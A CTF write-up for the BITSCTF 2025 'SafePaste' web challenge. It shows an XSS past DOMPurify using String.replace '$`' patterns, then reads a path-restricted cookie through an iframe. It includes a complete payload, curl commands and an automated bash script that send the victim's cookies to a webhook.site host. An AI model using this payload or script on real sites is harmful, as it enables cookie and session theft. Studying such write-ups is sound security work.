# SafePaste - BITSCTF 2025 Web Challenge Writeup

## Challenge Information

| Field      | Value                                                                                              |
| ---------- | -------------------------------------------------------------------------------------------------- |
| CTF        | BITSCTF 2025                                                                                       |
| Category   | Web                                                                                                |
| Name       | SafePaste                                                                                          |
| Difficulty | Hard                                                                                               |
| Flag       | `BITSCTF{n07_r34lly_4_d0mpur1fy_byp455?_w3b_6uy_51nc3r3ly_4p0l061535_f0r_7h3_pr3v10u5_ch4ll3n635}` |

---

## Description

SafePaste is a "pastebin" style web application that allows users to create pastes with HTML content. The content is sanitized using **DOMPurify 3.3.1** (the most recent version, with no known bypasses in default configuration) before being stored. An admin bot visits reported pastes and carries a `FLAG` cookie containing the challenge flag.

---

## Reconnaissance

### Technology Stack

- **Backend**: Express 5 with TypeScript (tsx)
- **Sanitization**: `isomorphic-dompurify@2.36.0` (a DOMPurify 3.3.1 wrapper over jsdom for Node.js)
- **Bot**: Puppeteer with headless Chromium
- **Container**: Docker with Node 20

### Key Files

The application has a simple structure:

```
safe-paste/
├── server.ts          # Main Express server
├── bot.ts             # Admin bot (Puppeteer)
├── views/
├── index.html     # Form for creating and reporting pastes
└── paste.html     # Template for viewing pastes
├── Dockerfile
├── docker-compose.yml
└── package.json
```

---

## Source Code Analysis

### server.ts - Main Server

```typescript
import DOMPurify from "isomorphic-dompurify";

const pastes = new Map<string, string>();

// Template read once at startup
const pasteTemplate = readFileSync(
  join(__dirname, "views", "paste.html"),
  "utf-8",
);

// Permissive CSP: unsafe-inline and unsafe-eval in scripts
app.use((req, res, next) => {
  res.setHeader(
    "Content-Security-Policy",
    "script-src 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; default-src 'self'",
  );
  next();
});

// Create paste: sanitizes with DOMPurify and stores
app.post("/create", (req, res) => {
  const content = req.body.content;
  const id = uuidv4();
  const clean = DOMPurify.sanitize(content); // <-- Sanitization
  pastes.set(id, clean);
  res.redirect(`/paste/${id}`);
});

// View paste: replaces {paste} in the template with sanitized content
app.get("/paste/:id", (req, res) => {
  const content = pastes.get(req.params.id);
  const html = pasteTemplate.replace("{paste}", content); // <-- VULNERABILITY
  res.type("html").send(html);
});

// Report: validates hostname and sends to the bot
app.post("/report", async (req, res) => {
  const parsed = new URL(url);
  if (parsed.hostname !== APP_HOST && parsed.hostname !== "localhost") {
    return res.status(400).send("URL must be on this server");
  }
  visit(url).catch((e) => console.error("Visit failed:", e));
});

// Hidden endpoint that destroys the socket if the secret is missing
app.get("/hidden", (req, res) => {
  if (req.query.secret === ADMIN_SECRET) {
    return res.send("Welcome, admin!");
  }
  res.socket?.destroy();
});
```

**Key Observations:**

1. **DOMPurify 3.3.1 with default configuration** - there are no `ADD_TAGS`, `ALLOWED_ATTR`, custom hooks, or `SAFE_FOR_TEMPLATES`. No known public bypasses exist for this version with defaults.

2. **`pasteTemplate.replace("{paste}", content)`** - the sanitized content is used as the **second argument** (replacement string) for `String.prototype.replace()`. This is critical.

3. **CSP with `unsafe-inline`** - if we achieve XSS, we can execute inline JavaScript without restrictions.

4. **`default-src 'self'`** - blocks external connections (`fetch`, `XMLHttpRequest`, `new Image().src`), but **DOES NOT block navigation** (`window.location`).

### bot.ts - Admin Bot

```typescript
export async function visit(url: string): Promise<void> {
  const browser = await puppeteer.launch({
    headless: true,
    args: BROWSER_ARGS,
  });
  const page = await browser.newPage();

  await page.setCookie({
    name: "FLAG",
    value: FLAG,
    domain: APP_HOST,
    path: "/hidden", // <-- Cookie only accessible at /hidden/*
  });

  await page.goto(url, { waitUntil: "networkidle2", timeout: 5000 });
  await new Promise((r) => setTimeout(r, 15000)); // Waits 15 seconds
  await browser.close();
}
```

**Observations:**

1. The `FLAG` cookie has `path: "/hidden"` - it is only sent by the browser to URLs whose path starts with `/hidden`.
2. The cookie is **NOT httpOnly** - it is accessible from JavaScript via `document.cookie`.
3. The bot waits for 15 seconds - enough time for our exploit to run.

### views/paste.html - Template

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>SafePaste - View Paste</title>
  </head>
  <body>
    <nav><a href="/">🔒 SafePaste</a></nav>
    <div class="paste-container">
      <img src="/logo.png" alt="SafePaste" />
      <div class="content">{paste}</div>
    </div>
  </body>
</html>
```

The `{paste}` placeholder is replaced by the sanitized content. The template contains double-quoted attributes such as `lang="en"`, `charset="UTF-8"`, `class="paste-container"`, etc.

---

## Vulnerability Identification

### The Problem: `String.prototype.replace()` and `$` Special Patterns

In JavaScript, when using `String.prototype.replace(search, replacement)`, the second argument (replacement) supports **special substitution patterns**:

| Pattern  | Meaning                                                            |
| -------- | ------------------------------------------------------------------ |
| `$$`     | Inserts a literal `$`                                              |
| `$&`     | Inserts the matched substring (in this case, `{paste}`)            |
| `` $` `` | Inserts the portion of the string **BEFORE** the match (pre-match) |
| `$'`     | Inserts the portion of the string **AFTER** the match (post-match) |

The vulnerable code is:

```typescript
const html = pasteTemplate.replace("{paste}", content);
```

Here, `content` is the value sanitized by DOMPurify. If the sanitized content includes `` $` ``, JavaScript interprets it as a special pattern and replaces it with all the template text appearing **before** `{paste}`.

### What does the pre-match contain?

The pre-match (`` $` ``) is all the template HTML before `{paste}`:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>SafePaste - View Paste</title>
  </head>
  <body>
    <nav><a href="/">🔒 SafePaste</a></nav>
    <div class="paste-container">
      <img src="/logo.png" alt="SafePaste" />
      <div class="content"></div>
    </div>
  </body>
</html>
```

This text contains **multiple `"` characters** in HTML attributes: `lang="en"`, `charset="UTF-8"`, etc.

### The Attack: Attribute Breakout via `` $` ``

The exploit idea:

1. Place `` $` `` **inside an attribute value** delimited by double quotes.
2. DOMPurify sees it as harmless text (`$` and `` ` `` are not dangerous).
3. `String.replace` substitutes `` $` `` with the template's pre-match content.
4. The pre-match includes a `"` (from `lang="en"`), which **breaks out of the attribute** in the browser.
5. Everything following `` $` `` in our payload is now interpreted as real HTML.

### Step-by-Step Visualization

**User Input:**

```html
<a title="$`<noembed></noembed><img src=x onerror='alert(1)'>">Z</a>
```

**After DOMPurify (Sanitized):**

DOMPurify sees an `<a>` element with a `title` attribute. The attribute value is a text string containing `` $` ``, `<noembed>`, `<img>`, `onerror`, etc. To DOMPurify, this is **just text inside an attribute**, not executable HTML. There is no DOMPurify bypass - the output is identical to the input:

```html
<a title="$`<noembed></noembed><img src=x onerror='alert(1)'>">Z</a>
```

**Why doesn't DOMPurify block it?**

- `` $` `` is normal text, not dangerous HTML.
- `<noembed>`, `<img>`, `onerror='alert(1)'` are **inside the `title` attribute value** - they are just characters, not actual elements or event handlers.
- DOMPurify DOES block patterns like `</textarea>`, `</title>`, `</style>` inside attributes (to prevent RAWTEXT breakouts). However, it **DOES NOT block** `</noembed>`, `</xmp>`, or `</noframes>`.
- The `<` and `>` characters inside attributes delimited by `"` are not escaped in HTML serialization (according to the spec, only `"`, `&`, and NBSP are escaped in attribute mode).

**After `String.replace("{paste}", sanitized):`**

The `` $` `` is replaced with the pre-match (the entire template before `{paste}`):

```html
<div class="content"><a title="<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  ...
  <title>SafePaste - View Paste</title>
</head>
<body>
  ...
    <div class="content"><noembed></noembed><img src=x onerror='alert(1)'>">Z</a></div>
```

**How the browser interprets it:**

1. `<a title="<!DOCTYPE html>\n<html lang="` - the browser is parsing the `title` attribute value (delimited by `"`). It finds the `"` from `lang="`, which **closes the title attribute**.

2. `en">` - `en"` is interpreted as an attribute name (with the `"` included, silent parse error), then `>` **closes the `<a>` tag**.

3. The rest of the pre-match (`<head>`, `<meta>`, `<title>`, `<body>`, `<div>`, `<img>`, etc.) is parsed as normal HTML - benign template elements.

4. `<noembed>` - the browser creates a `<noembed>` element and enters **RAWTEXT** mode (all content is treated as raw text until `</noembed>` is found).

5. `</noembed>` - closes the noembed immediately. The browser returns to normal HTML mode.

6. **`<img src=x onerror='alert(1)'>`** - now in HTML mode, the browser parses this as a real `<img>` element with an `onerror` event handler. The `src=x` image fails to load, and **`alert(1)` executes**. XSS achieved.

---

## Exfiltrating the FLAG Cookie

### The `path: "/hidden"` Problem

The `FLAG` cookie has `path: "/hidden"`. This means `document.cookie` on a page with a `/paste/xxx` URL **does not include** the FLAG cookie. We need to read the cookie from a page whose path starts with `/hidden`.

### Solution: Iframe to `/hidden/x`

The `/hidden` endpoint destroys the socket if you lack the secret. However, `/hidden/x` has no defined route in Express - it returns a standard 404 ("Cannot GET /hidden/x") without destroying the socket. Since the path `/hidden/x` starts with `/hidden`, the browser **sends the FLAG cookie** with the request.

From our XSS in `/paste/xxx`, we create an iframe pointing to `/hidden/x`:

```javascript
var f = document.createElement(`iframe`);
f.src = `/hidden/x`;
f.onload = function () {
  // The iframe loaded /hidden/x (same origin)
  // The iframe's document.cookie includes FLAG because path="/hidden" matches
  location = `https://webhook.site/WEBHOOK_ID?c=` + f.contentDocument.cookie;
};
document.body.appendChild(f);
```

- The iframe is **same-origin** (same domain and port), so `f.contentDocument` is accessible.
- `f.contentDocument.cookie` includes `FLAG=BITSCTF{...}` because the `/hidden/x` path matches `path="/hidden"`.
- We use `window.location` for exfiltration because the CSP (`default-src 'self'`) blocks `fetch` and `XMLHttpRequest` to external domains, but **does not restrict navigation**.

### Why Backticks instead of Quotes?

The JavaScript payload needs to avoid both `"` and `'`:

- `"` (double quote) would close the `title` attribute during jsdom/DOMPurify parsing, breaking the payload structure before it reaches `String.replace`.
- `'` (single quote) would close the `onerror='...'` attribute during browser parsing after the breakout.

Solution: **ES6 template literals** (backticks `` ` ``):

```javascript
document.createElement(
  `iframe`,
) // instead of "iframe" or 'iframe'
`/hidden/x` // instead of "/hidden/x"
`https://webhook.site/...?c=`; // instead of "https://..."
```

Backticks are not special characters in HTML (they don't close `"..."` or `'...'` attributes), and they are valid character string delimiters in JavaScript.

---

## Final Payload

```html
<a
  title="$`<noembed></noembed><img src=x onerror='var f=document.createElement(`iframe`);f.src=`/hidden/x`;f.onload=function(){location=`https://webhook.site/WEBHOOK_ID?c=`+f.contentDocument.cookie};document.body.appendChild(f)'>"
  >Z</a
>
```

### Payload Breakdown

| Part                   | Purpose                                                                                        |
| ---------------------- | ---------------------------------------------------------------------------------------------- |
| `<a title="`           | `<a>` element with a `title` attribute - allowed by DOMPurify                                  |
| `` $` ``               | Special `String.replace` pattern - injects the pre-match (template prefix with a `"` breakout) |
| `<noembed></noembed>`  | RAWTEXT element that creates/closes context (technically optional, but ensures clean parsing)  |
| `<img src=x`           | Image with invalid src to trigger `onerror`                                                    |
| `onerror='JS_PAYLOAD'` | Event handler with single quotes (parsed as real HTML after the breakout)                      |
| `'>`                   | Closes the `onerror` attribute and the `<img>` tag in the browser                              |
| `">Z</a>`              | Closes the `title` attribute and the `<a>` tag in jsdom (for DOMPurify)                        |

---

## Exploit Execution

### Step 1: Create the Malicious Paste

```bash
curl -s -X POST http://TARGET:3000/create \
  --data-urlencode 'content=<a title="$`<noembed></noembed><img src=x onerror='"'"'var f=document.createElement(`iframe`);f.src=`/hidden/x`;f.onload=function(){location=`https://webhook.site/WEBHOOK_ID?c=`+f.contentDocument.cookie};document.body.appendChild(f)'"'"'>">Z</a>' \
  -L -o /dev/null -w '%{url_effective}'
```

Response: `http://TARGET:3000/paste/UUID`

### Step 2: Report the Paste to the Bot

```bash
curl -s -X POST http://TARGET:3000/report \
  --data-urlencode 'url=http://TARGET:3000/paste/UUID'
```

Response: `Admin will review your paste shortly...`

### Step 3: Wait and Collect the Flag

After ~20 seconds, the webhook receives:

```
GET /WEBHOOK_ID?c=FLAG=BITSCTF{n07_r34lly_4_d0mpur1fy_byp455?...}
```

---

## Full Flow Diagram

```
User                       Server                      Bot (Puppeteer)
  |                            |                              |
  |--- POST /create ---------->|                              |
  |    content=PAYLOAD         |                              |
  |                            |-- DOMPurify.sanitize() -->   |
  |                            |   (passes unchanged)         |
  |                            |-- pastes.set(id, clean) -->  |
  |<-- 302 /paste/UUID --------|                              |
  |                            |                              |
  |--- POST /report ---------->|                              |
  |    url=/paste/UUID         |                              |
  |                            |--- visit(url) -------------->|
  |                            |                              |
  |                            |              page.setCookie(FLAG)
  |                            |              page.goto(/paste/UUID)
  |                            |                              |
  |                            |   The server does:           |
  |                            |   template.replace("{paste}",|
  |                            |     sanitized_with_$`)       |
  |                            |                              |
  |                            |   $` → pre-match (template   |
  |                            |   prefix with " which breaks |
  |                            |   the attribute)             |
  |                            |                              |
  |                            |              Browser parses:
  |                            |              " breaks title attr
  |                            |              > closes <a> tag
  |                            |              <noembed>...</noembed>
  |                            |              <img onerror='JS'>
  |                            |                    |
  |                            |              JS creates /hidden/x iframe
  |                            |              Reads FLAG cookie from iframe
  |                            |              Redirects to webhook
  |                            |                    |
  Webhook                      |                    |
  <------- GET ?c=FLAG=BITSCTF{...} ---------------|
```

---

## Automated Script

```bash
#!/bin/bash
TARGET="${1:-http://20.193.149.152:3000}"
WEBHOOK="${2:-https://webhook.site/YOUR-WEBHOOK-ID}"

JS="var f=document.createElement(\`iframe\`);f.src=\`/hidden/x\`;"
JS+="f.onload=function(){location=\`${WEBHOOK}?c=\`+f.contentDocument.cookie};"
JS+="document.body.appendChild(f)"

PAYLOAD="<a title=\"\$\`<noembed></noembed><img src=x onerror='${JS}'>\">Z</a>"

echo "[*] Creating paste..."
URL=$(curl -s -X POST "${TARGET}/create" \
  --data-urlencode "content=${PAYLOAD}" -L -o /dev/null -w '%{url_effective}')
echo "[+] Paste: $URL"

echo "[*] Reporting to bot..."
curl -s -X POST "${TARGET}/report" --data-urlencode "url=${URL}"

echo "[*] Waiting 25s... Check your webhook"
sleep 25
echo "[+] Webhook: $WEBHOOK"
```

---

## Summary of Chained Vulnerabilities

| #   | Vulnerability                                                                 | Impact                                                                |
| --- | ----------------------------------------------------------------------------- | --------------------------------------------------------------------- |
| 1   | `String.replace()` with user-controlled content as replacement string         | Allows template text injection via `$\``                              |
| 2   | Template pre-match contains `"` in HTML attributes                            | Breaks the attribute context in the browser                           |
| 3   | DOMPurify does not escape `<`, `>`, or event handlers inside attribute values | The `<img onerror=...>` payload survives as text inside the attribute |
| 4   | CSP allows `unsafe-inline` in scripts                                         | The XSS executes JavaScript without restrictions                      |
| 5   | FLAG cookie lacks `httpOnly` and has `path: "/hidden"`                        | Accessible via `document.cookie` from an iframe to `/hidden/x`        |
| 6   | CSP does not restrict navigation (`navigate-to` not defined)                  | Exfiltration via `window.location` to an external webhook             |

---
